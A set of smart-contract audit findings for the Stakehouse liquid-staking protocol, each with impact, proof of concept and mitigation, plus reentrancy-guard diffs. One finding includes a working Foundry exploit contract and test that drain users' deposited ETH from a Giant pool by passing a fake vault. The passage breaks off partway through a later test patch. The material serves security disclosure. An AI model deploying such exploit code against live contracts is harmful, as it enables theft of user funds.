functions: - [`beforeTokenTransfer`, **GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167) - [`withdrawLPTokens`, **GiantPoolBase** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90) - [`batchDepositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104) - [`depositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143) - [`beforeTokenTransfer`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340)  ```diff File: contracts/liquid-staking/GiantMevAndFeesPool.sol  @@ -143,7 +143,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate      }       /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed -    function beforeTokenTransfer(address _from, address _to, uint256) external { +    function beforeTokenTransfer(address _from, address _to, uint256) external nonReentrant {          require(msg.sender == address(lpTokenETH), "Caller is not giant LP");          updateAccumulatedETHPerLP(); ```  ```diff File: contracts/liquid-staking/GiantPoolBase.sol  @@ -66,7 +66,7 @@ contract GiantPoolBase is ReentrancyGuard {      /// @notice Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP      /// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool      /// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP -    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external { +    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external nonReentrant {          uint256 amountOfTokens = _lpTokens.length;          require(amountOfTokens > 0, "Empty arrays");          require(amountOfTokens == _amounts.length, "Inconsistent array lengths"); ```  ```diff File: contracts/liquid-staking/StakingFundsVault.sol  @@ -66,7 +66,7 @@ contract StakingFundsVault is      /// @notice Batch deposit ETH for staking against multiple BLS public keys      /// @param _blsPublicKeyOfKnots List of BLS public keys being staked      /// @param _amounts Amounts of ETH being staked for each BLS public key -    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable { +    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable nonReentrant {          uint256 numOfValidators = _blsPublicKeyOfKnots.length;          require(numOfValidators > 0, "Empty arrays");          require(numOfValidators == _amounts.length, "Inconsistent array lengths");  @@ -110,7 +110,7 @@ contract StakingFundsVault is      /// @notice Deposit ETH against a BLS public key for staking      /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner      /// @param _amount Amount of ETH being staked -    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) { +    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable nonReentrant returns (uint256) {          require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key is banned or not a part of LSD network");          require(              getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,  @@ -312,7 +312,7 @@ contract StakingFundsVault is      }       /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards -    function beforeTokenTransfer(address _from, address _to, uint256) external override { +    function beforeTokenTransfer(address _from, address _to, uint256) external override nonReentrant {          address syndicate = liquidStakingNetworkManager.syndicate();          if (syndicate != address(0)) {              LPToken token = LPToken(msg.sender); ``` 
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L206-L207 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209   # Vulnerability details  ## Impact Liquid staking manager call `function withdrawETHForStaking(address _smartWallet, uint256 _amount)` to withdraw ETH for staking. It's manager's responsibility to set the correct `_smartWallet` address. However, there is no way to guarantee this. If a typo (or any other reasons) leads to a non-zero non-existent `_smartWallet` address, this function won't be able to detect the problem, and the [ETH transfer statement](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209) will always return `true`. This will result in the ETH permanently locked to a non-existent account.  ## Proof of Concept Liquid staking manager call `function withdrawETHForStaking(address _smartWallet, uint256 _amount)` with a non-zero non-existent `_smartWallet` address and some `_amount` of ETH. Function call will succeed but the ETH will be locked to the non-existent `_smartWallet` address.  ## Tools Used Manual audit.  ## Recommended Mitigation Steps The problem can be solved if we can verify the `_smartWallet` is a valid existent smartWallet before ETH transfer. The easiest solution is to verify the smartWallet has a valid owner since the smart wallet we are using is ownable. So, just add the checking owner code before [ETH transfer](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209).
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L50-L64 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L180-L193   # Vulnerability details  ## Impact Function `_distributeETHRewardsToUserForToken()` is used to distribute remaining reward of user and it's called in `_onWithdraw()` of `GiantMevAndFeesPool`. but function `withdrawETH()` in `GiantPoolBase` don't call either of them and burn user giant LP token balance so if user withdraw his funds and has some remaining ETH rewards he would lose those rewards because his balance set to zero.  ## Proof of Concept This is `withdrawETH()` code in `GiantPoolBase`: ```     /// @notice Allow a user to chose to burn their LP tokens for ETH only if the requested amount is idle and available from the contract     /// @param _amount of LP tokens user is burning in exchange for same amount of ETH     function withdrawETH(uint256 _amount) external nonReentrant {         require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");         require(lpTokenETH.balanceOf(msg.sender) >= _amount, "Invalid balance");         require(idleETH >= _amount, "Come back later or withdraw less ETH");          idleETH -= _amount;          lpTokenETH.burn(msg.sender, _amount);         (bool success,) = msg.sender.call{value: _amount}("");         require(success, "Failed to transfer ETH");          emit LPBurnedForETH(msg.sender, _amount);     } ``` As you can see it burn user `lpTokenETH` balance and don't call either `_distributeETHRewardsToUserForToken()` or `_onWithdraw()`. and in function `claimRewards()` uses `lpTokenETH.balanceOf(msg.sender)` to calculate user rewards so if user balance get to `0` user won't get the remaining rewards. These are steps that this bug happens: 1. `user1` deposit `10` ETH into the giant pool and `claimed[user1][lpTokenETH]` is `20` and `accumulatedETHPerLPShare` is `2`. 2. some time passes and `accumulatedETHPerLPShare` set to `3`. 3. `user1` unclaimed rewards are `10 * 3 - 20 = 10` ETH. 4. `user1` withdraw his `10` ETH by calling `withdrawETH(10)` and contract set `lpTokenETH` balance of `user1`  to `0` and transfer `10` ETH to user. 5. now if `user1` calls `claimRewards()` he would get `0` reward as his `lpTokenETH` balance is `0`.  so users lose their unclaimed rewards by withdrawing their funds.  ## Tools Used VIM  ## Recommended Mitigation Steps user's unclaimed funds should be calculated and transferred before any actions that change user's balance.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50 https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44   # Vulnerability details  ## Impact An attacker can withdraw all ETH staked by users in a Giant pool. Both `GiantSavETHVaultPool` and `GiantMevAndFeesPool` are affected. ## Proof of Concept The `batchDepositETHForStaking` function in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes ([GiantSavETHVaultPool.sol#L48-L58](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L48-L58)): ```solidity SavETHVault savETHPool = SavETHVault(_savETHVaults[i]); require(     liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),     "Invalid liquid staking manager" );  // Deposit ETH for staking of BLS key savETHPool.batchDepositETHForStaking{ value: transactionAmount }(     _blsPublicKeys[i],     _stakeAmounts[i] ); ```  An attacker can pass an exploit contract as a vault. The exploit contract will implement `liquidStakingManager` that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract: ```solidity // test/foundry/GiantPools.t.sol contract GiantPoolExploit {     address immutable owner = msg.sender;     address validStakingManager;      constructor(address validStakingManager_) {         validStakingManager = validStakingManager_;     }      function liquidStakingManager() public view returns (address) {         return validStakingManager;     }      function batchDepositETHForStaking(bytes[] calldata /*_blsPublicKeyOfKnots*/, uint256[] calldata /*_amounts*/) external payable {         payable(owner).transfer(address(this).balance);     } }  function testPoolDraining_AUDIT() public {     // Register BLS key     address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);     registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);      // Set up users and ETH     address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);      address attacker = address(0x1337);     vm.label(attacker, "attacker");     vm.deal(attacker, 1 ether);      // User deposits ETH into Giant savETH     vm.prank(savETHUser);     giantSavETHPool.depositETH{value: 24 ether}(24 ether);     assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);     assertEq(address(giantSavETHPool).balance, 24 ether);      // Attacker deploys an exploit.     vm.startPrank(attacker);     GiantPoolExploit exploit = new GiantPoolExploit(address(manager));     vm.stopPrank();      // Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.     bytes[][] memory blsKeysForVaults = new bytes[][](1);     blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);      uint256[][] memory stakeAmountsForVaults = new uint256[][](1);     stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);      giantSavETHPool.batchDepositETHForStaking(         getAddressArrayFromValues(address(exploit)),         getUint256ArrayFromValues(24 ether),         blsKeysForVaults,         stakeAmountsForVaults     );      // Vault got nothing.     assertEq(address(manager.savETHVault()).balance, 0 ether);     // Attacker has stolen user's deposit.     assertEq(attacker.balance, 25 ether); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Consider taking a list of `LiquidStakingManager` addresses instead of vault addresses: ```diff --- a/contracts/liquid-staking/GiantSavETHVaultPool.sol +++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol @@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {      /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding      /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding      function batchDepositETHForStaking( -        address[] calldata _savETHVaults, +        address[] calldata _liquidStakingManagers,          uint256[] calldata _ETHTransactionAmounts,          bytes[][] calldata _blsPublicKeys,          uint256[][] calldata _stakeAmounts      ) public { -        uint256 numOfSavETHVaults = _savETHVaults.length; +        uint256 numOfSavETHVaults = _liquidStakingManagers.length;          require(numOfSavETHVaults > 0, "Empty arrays");          require(numOfSavETHVaults == _ETHTransactionAmounts.length, "Inconsistent array lengths");          require(numOfSavETHVaults == _blsPublicKeys.length, "Inconsistent array lengths"); @@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {           // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator          for (uint256 i; i < numOfSavETHVaults; ++i) { +            require( +                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]), +                "Invalid liquid staking manager" +            ); +              uint256 transactionAmount = _ETHTransactionAmounts[i];               // As ETH is being deployed to a savETH pool vault, it is no longer idle              idleETH -= transactionAmount;  -            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]); -            require( -                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())), -                "Invalid liquid staking manager" -            ); +            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i])); +            SavETHVault savETHPool = liquidStakingManager.savETHVault();               // Deposit ETH for staking of BLS key              savETHPool.batchDepositETHForStaking{ value: transactionAmount }( ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L52-L64   # Vulnerability details  ## Impact GiantMevAndFeesPool.withdrawETH calls lpTokenETH.burn, then GiantMevAndFeesPool.beforeTokenTransfer, followed by a call to _distributeETHRewardsToUserForToken sends ETH to the user, which allows the user to call any function in the fallback. While GiantMevAndFeesPool.withdrawETH has the nonReentrant modifier, GiantMevAndFeesPool.claimRewards does not have the nonReentrant modifier. When GiantMevAndFeesPool.claimRewards is called in GiantMevAndFeesPool.withdrawETH, the idleETH is reduced but the ETH is not yet sent to the user, which increases totalRewardsReceived and accumulatedETHPerLPShare, thus making the user receive more rewards when calling GiantMevAndFeesPool.claimRewards. ## Proof of Concept https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L52-L64 ## Tools Used None ## Recommended Mitigation Steps Change to ```diff function withdrawETH(uint256 _amount) external nonReentrant {     require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");     require(lpTokenETH.balanceOf(msg.sender) >= _amount, "Invalid balance");     require(idleETH >= _amount, "Come back later or withdraw less ETH");  -  idleETH -= _amount;      lpTokenETH.burn(msg.sender, _amount); +  idleETH -= _amount;      (bool success,) = msg.sender.call{value: _amount}("");     require(success, "Failed to transfer ETH");      emit LPBurnedForETH(msg.sender, _amount); } ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L195-L204 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L33-L48   # Vulnerability details  ## Impact When `depositETH()` is called in giant pool it calls `_onDepositETH()` which calls `_setClaimedToMax()` to make sure new ETH stakers are not entitled to ETH earned by but this can cause users to lose their remaining rewards when they deposits. code should first transfer user remaining rewards when deposit happens.  ## Proof of Concept This is `depositETH()` code in `GiantPoolBase`: ```     /// @notice Add ETH to the ETH LP pool at a rate of 1:1. LPs can always pull out at same rate.     function depositETH(uint256 _amount) public payable {         require(msg.value >= MIN_STAKING_AMOUNT, "Minimum not supplied");         require(msg.value == _amount, "Value equal to amount");          // The ETH capital has not yet been deployed to a liquid staking network         idleETH += msg.value;          // Mint giant LP at ratio of 1:1         lpTokenETH.mint(msg.sender, msg.value);          // If anything extra needs to be done         _onDepositETH();          emit ETHDeposited(msg.sender, msg.value);     } ``` As you can see it increase user `lpTokenETH` balance and then calls `_onDepositETH()`. This is `_onDepositETH()` and `_setClaimedToMax()` code in `GiantMevAndFeesPool` contract: ```     /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued     function _onDepositETH() internal override {         _setClaimedToMax(msg.sender);     }      /// @dev Internal re-usable method for setting claimed to max for msg.sender     function _setClaimedToMax(address _user) internal {         // New ETH stakers are not entitled to ETH earned by         claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;     } ``` As you can see the code set `claimed[msg.sender][address(lpTokenETH]` to maximum value so the user wouldn't be entitled to previous rewards but if user had some remaining rewards in contract he would lose those rewards can't withdraw them. these are the steps: 1- `user1` deposit `10` ETH to giant pool and `accumulatedETHPerLPShare` value is `2` and `claimed[user1][lpTokenETH]` would be `10 * 2 = 20`. 2- some time passes and `accumulatedETHPerLPShare` set to `4` and `user1` has `10 * 4 - 20 = 20` unclaimed ETH rewards (the formula in the code: `balance * rewardPerShare - claimed`). 3- `user` deposit `5` ETH to giant pool and `accumulatedETHPerLPShare` is `4` so the code would call `_onDepositETH()` which calls `_setClaimedToMax` which sets `claimed[user1][lpTokenETH]` to `15 * 4 = 60`. 4- `user1` new remaining ETH reward would be `15 * 4 - 60 = 0`. and `user1` won't receive his rewards because when he deposits contract don't transfer remaining rewards and set claim to max so user loses his funds.  ## Tools Used VIM  ## Recommended Mitigation Steps when deposit happens contract should first send remaining rewards, then increase the user's balance and then set the user claim to max.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L133-L157 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L24-L25   # Vulnerability details  ## Impact Variable `idleETH` in giant pools is storing total amount of ETH sat idle ready for either withdrawal or depositing into a liquid staking network and whenever a deposit or withdraw happens contract adjust the value of `idleETH` of contract, but in function `bringUnusedETHBackIntoGiantPool()` which brings unused ETH from savETH vault to giant pool the value of `idleETH` don't get increased which would cause those ETH balance to not be accessible for future staking or withdrawing.  ## Proof of Concept This is `bringUnusedETHBackIntoGiantPool()` code in `GiantSavETHVaultPool()`: ```     /// @notice Any ETH that has not been utilized by a savETH vault can be brought back into the giant pool     /// @param _savETHVaults List of savETH vaults where ETH is staked     /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a savETH vault     /// @param _amounts Amounts of LP within the giant pool being burnt     function bringUnusedETHBackIntoGiantPool(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, "Empty arrays");         require(numOfVaults == _lpTokens.length, "Inconsistent arrays");         require(numOfVaults == _amounts.length, "Inconsistent arrays");         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);             for (uint256 j; j < _lpTokens[i].length; ++j) {                 require(                     vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,                     "ETH is either staked or derivatives minted"                 );             }              vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }     } ``` As you can see it checks that ETH is available in savETH vault and then calls to `burnLPTokens()` to burn savETH LP tokens and bring unused ETH to giant pool address, this would increase giant pool ETH balance but code don't increase the `idleETH` value so contract would lose tracking of real idle ETH balance of contract. because the vaule of `idleETH` is used when withdrawing or depositing into savETH vaults so the contract can't reuse the returned ETH. these are the steps that cause this bug to happen: 1- giant pool has 100 `idleETH`. 2- with function `batchDepositETHForStaking()` users stake 80 `ETH` and the new value of `idleETH` would be `20` and contract LP Token balance increase by 80. 3- the 80 newly staked ETH is not yet staked in `stakehouse`. 4- with function `bringUnusedETHBackIntoGiantPool()` users bring back those 80 `ETH` from Vaults to giant pool and burn giant pool LP tokens and then giant pool have 100 idle ETH but because `idleETH` value don't get increase it still would show `20`. 5- the extra 80 ETH would returned to giant pool wouldn't be accessible for withdrawing to users or depositing into Vaults because in withdrawing or depositing into Vaults the value of `idleETH` has been used to know the amount of idle ETH in giant pool and because the value doesn't show the correct amount so the extra amount of ETH wouldn't be lost.  ## Tools Used VIM  ## Recommended Mitigation Steps contract should correctly update value of `idleETH` in different actions because withdraw and deposit logics depend on it.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L62-L102   # Vulnerability details  ## Impact Function `withdrawDETH()` in `GiantSavETHVaultPool` allows a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults. This function make external calls to user provided addresses without checking those addresses and send increased dETH balance of contract during the call to user. user can provide malicious addresses to contract and then took the execution flow during the transaction and increase dETH balance of contract by other calls and make contract to transfer them to him.  ## Proof of Concept This is `withdrawDETH()` in `GiantSavETHVaultPool`  code: ```     /// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults     /// @param _savETHVaults List of savETH vaults being interacted with     /// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH     /// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETH     function withdrawDETH(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, "Empty arrays");         require(numOfVaults == _lpTokens.length, "Inconsistent arrays");         require(numOfVaults == _amounts.length, "Inconsistent arrays");          // Firstly capture current dETH balance and see how much has been deposited after the loop         uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);              // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user             for (uint256 j; j < _lpTokens[i].length; ++j) {                 LPToken token = _lpTokens[i][j];                 uint256 amount = _amounts[i][j];                  // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP                 _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);                  require(vault.isDETHReadyForWithdrawal(address(token)), "dETH is not ready for withdrawal");                  // Giant LP is burned 1:1 with LPs from sub-networks                 require(lpTokenETH.balanceOf(msg.sender) >= amount, "User does not own enough LP");                  // Burn giant LP from user before sending them dETH                 lpTokenETH.burn(msg.sender, amount);                  emit LPBurnedForDETH(address(token), msg.sender, amount);             }              // Ask             vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }          // Calculate how much dETH has been received from burning         dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;          // Send giant LP holder dETH owed         getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);     } ``` As you can see first contract save the dETH balance of contract by this line: `uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));` and then it loops through user provided vaults addresses and call those vaults to withdraw dETH and in the end it calculates `dETHReceivedFromAllSavETHVaults` and transfer those dETH to user: ` getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);`. attacker can perform these steps: 1- create a malicious contract `AttackerVault` which is copy of `SavETHVault` with modifiction. 2- call `withdrawDETH()` with Vault list `[ValidVault1, ValidVault2, AttackerVault, ValidVaul3]`. 3- contract would save the dETH balance of itself and then loops through Vaults to validate and burn LPTokens. 4- contract would reach Vault `AttackerVault` and call attacker controlled address. 5- attacker contract call other functions to increase dETH balance of contract (if it's not possible to increase dETH balance of contract by other way so there is no need to save contract initial balance of dETH before the loop and dETH balance of contract would be zero always) 6- `withdrawDETH()` would finish the loop and transfer all the increase dETH balance to attacker which includes extra amounts.  because contract don't check the provided addresses and calls them and there is no reentrancy defense mechanism there is possibility of reentrancy attack which can cause fund lose.  ## Tools Used VIM  ## Recommended Mitigation Steps check the provided addresses and also have some reentrancy defence mechanisim.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L170-L173   # Vulnerability details  ## Impact When a user transfers away GiantMevAndFeesPool tokens, the pool's claimed[] computed is left unchanged and still corresponds to what they had claimed with their old (higher) number of tokens. (See GiantMevAndFeesPool afterTokenTransfer() - no adjustment is made to claimed[] on the from side.) As a result, their claimed[] may be higher than the max amount they could possibly have claimed for their new (smaller) number of tokens. The erroneous claimed value can cause an integer overflow when the claimed[] value is subtracted, leading to inability for this user to access some functions of the GiantMevAndFeesPool - including such things as being able to transfer their tokens (overflow is triggered in a callback attempting to pay out their rewards). These overflows will occur in SyndicateRewardsProcessor's _previewAccumulatedETH() and _distributeETHRewardsToUserForToken(), the latter of which is called in a number of places. When rewards are later accumulated in the pool, the user will not be able to claim certain rewards owed to them because of the incorrect (high) claimed[] value. The excess rewards will be orphaned in the pool.  ## Proof of Concept This patch demonstrates both DOS and orphaned rewards due to the claimed[] error described above. Note that the patch includes a temp fix for the separate issue calculating claimed[] in _distributeETHRewardsToUserForToken() in order to demonstrate this is a separate issue.  Run test ``` forge test -m testTransferDOSUserOrphansFutureRewards ```  Patch ```diff diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol index 81be706..ca44ae6 100644 --- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol +++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol @@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {              // Calculate how much ETH rewards the address is owed / due               uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];              if (due > 0) { -                claimed[_user][_token] = due; +                claimed[_user][_token] += due; // temp fix claimed calculation                    totalClaimed += due;   diff --git a/test/foundry/GiantPools.t.sol b/test/foundry/GiantPools.t.sol index 7e8bfdb..6468373 100644 --- a/test/foundry/GiantPools.t.sol +++ b/test/foundry/GiantPools.t.sol @@ -5,14 +5,18 @@ pragma solidity ^0.8.13;  import "forge-std/console.sol";  import { TestUtils } from "../utils/TestUtils.sol";   +import { MockLiquidStakingManager } from "../../contracts/testing/liquid-staking/MockLiquidStakingManager.sol";  import { GiantSavETHVaultPool } from "../../contracts/liquid-staking/GiantSavETHVaultPool.sol";  import { GiantMevAndFeesPool } from "../../contracts/liquid-staking/GiantMevAndFeesPool.sol";  import { LPToken } from "../../contracts/liquid-staking/LPToken.sol"; +import { GiantLP } from "../../contracts/liquid-staking/GiantLP.sol";  import { MockSlotRegistry } from "../../contracts/testing/stakehouse/MockSlotRegistry.sol";  import { MockSavETHVault } from "../../contracts/testing/liquid-staking/MockSavETHVault.sol";  import { MockGiantSavETHVaultPool } from "../../contracts/testing/liquid-staking/MockGiantSavETHVaultPool.sol";  import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";   +import "forge-std/console.sol"; +  contract GiantPoolTests is TestUtils {        MockGiantSavETHVaultPool public giantSavETHPool; @@ -116,4 +120,171 @@ contract GiantPoolTests is TestUtils {          assertEq(dETHToken.balanceOf(savETHUser), 24 ether);      }   +    function addNewLSM(address payable giantFeesAndMevPool, bytes memory blsPubKey) public returns (address payable) { +        manager = deployNewLiquidStakingNetwork( +            factory, +            admin, +            true, +            "LSDN" +        ); + +        savETHVault = MockSavETHVault(address(manager.savETHVault())); + +        giantSavETHPool = new MockGiantSavETHVaultPool(factory, savETHVault.dETHToken()); + +        // Set up users and ETH +        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether); +        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether); + +        // Register BLS key +        registerSingleBLSPubKey(nodeRunner, blsPubKey, accountFour); + +        // Deposit ETH into giant savETH +        vm.prank(savETHUser); +        giantSavETHPool.depositETH{value: 24 ether}(24 ether); +        assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether); +        assertEq(address(giantSavETHPool).balance, 24 ether); + +        // Deploy ETH from giant LP into savETH pool of LSDN instance +        bytes[][] memory blsKeysForVaults = new bytes[][](1); +        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKey); + +        uint256[][] memory stakeAmountsForVaults = new uint256[][](1); +        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether); + +        giantSavETHPool.batchDepositETHForStaking( +            getAddressArrayFromValues(address(manager.savETHVault())), +            getUint256ArrayFromValues(24 ether), +            blsKeysForVaults, +            stakeAmountsForVaults +        ); +        assertEq(address(manager.savETHVault()).balance, 24 ether); + +        assert(giantFeesAndMevPool.balance >= 4 ether); +        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether); +        GiantMevAndFeesPool(giantFeesAndMevPool).batchDepositETHForStaking( +            getAddressArrayFromValues(address(manager.stakingFundsVault())), +            getUint256ArrayFromValues(4 ether), +            blsKeysForVaults, +            stakeAmountsForVaults +        ); + +        // Ensure we can stake and mint derivatives +        stakeAndMintDerivativesSingleKey(blsPubKey); + +        return payable(manager); +    } + +    function testTransferDOSUserOrphansFutureRewards() public { + +        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 8 ether); +        address feesAndMevUserTwo = accountFour; + +       // Deposit ETH into giant fees and mev +        vm.startPrank(feesAndMevUserOne); +        giantFeesAndMevPool.depositETH{value: 8 ether}(8 ether); +        vm.stopPrank(); + +        MockLiquidStakingManager manager1 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyOne)); +        MockLiquidStakingManager manager2 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyTwo)); + +        bytes[][] memory blsPubKeyOneInput = new bytes[][](1); +        blsPubKeyOneInput[0] = getBytesArrayFromBytes(blsPubKeyOne); + +        bytes[][] memory blsPubKeyTwoInput = new bytes[][](1); +        blsPubKeyTwoInput[0] = getBytesArrayFromBytes(blsPubKeyTwo); + +        vm.warp(block.timestamp + 3 hours); + +        // Add 2 eth rewards to manager1's staking funds vault. +        vm.deal(address(manager1.stakingFundsVault()), 2 ether); + +        // Claim rewards into the giant pool and distribute them to user one. +        vm.startPrank(feesAndMevUserOne); +        giantFeesAndMevPool.claimRewards( +            feesAndMevUserOne, +            getAddressArrayFromValues(address(manager1.stakingFundsVault())), +            blsPubKeyOneInput); +        vm.stopPrank(); 